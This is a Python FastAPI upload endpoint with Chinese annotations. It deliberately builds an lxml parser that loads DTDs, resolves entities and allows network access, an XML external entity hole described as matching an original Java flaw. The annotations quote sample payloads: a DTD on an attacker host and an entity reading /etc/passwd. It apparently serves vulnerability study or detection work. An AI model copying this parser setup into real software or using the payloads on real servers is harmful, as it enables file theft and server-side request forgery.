```python
import io
from fastapi import FastAPI, UploadFile, File
from lxml import etree

app = FastAPI()

@app.post("/api/documents/preprocess")
async def preprocess_docx_entry(file: UploadFile = File(...)):
    xml_bytes = await file.read()
    parser = etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=False)
    try:
        tree = etree.parse(io.BytesIO(xml_bytes), parser)
    except etree.XMLSyntaxError:
        return {"error": "invalid xml entry"}
    result = tree.getroot()
    return {"entry": etree.tostring(result, encoding="unicode")}
```

1. 第 10 行：FastAPI 路由通过 `UploadFile` 接收上传的 docx 内 XML 条目，这是外部输入入口（source），与原 Java 中 `preprocess` 接收的 `InputStream` 等价。
2. 第 12 行：构造 `etree.XMLParser` 时显式设置 `resolve_entities=True`、`load_dtd=True`、`no_network=False`，即允许解析 DTD、展开实体并访问网络，与原代码 `XMLReaderFactory.createXMLReader()` 默认不禁用外部实体完全对应。
3. 第 14 行：`etree.parse(...)` 直接解析用户可控 XML，是危险 sink；解析过程中 `<!DOCTYPE ... SYSTEM "http://attacker/x.dtd">` 或 `<!ENTITY xxe SYSTEM "file:///etc/passwd">` 会被展开，造成任意文件读取/SSRF，进而可被利用执行代码。
4. 第 15-16 行：仅捕获语法错误，没有任何针对外部实体的防御（未使用 `resolve_entities=False`、`no_network=True` 或 `XMLParser` 的 `defusedxml` 替代），防御完全缺失，与原漏洞一致。
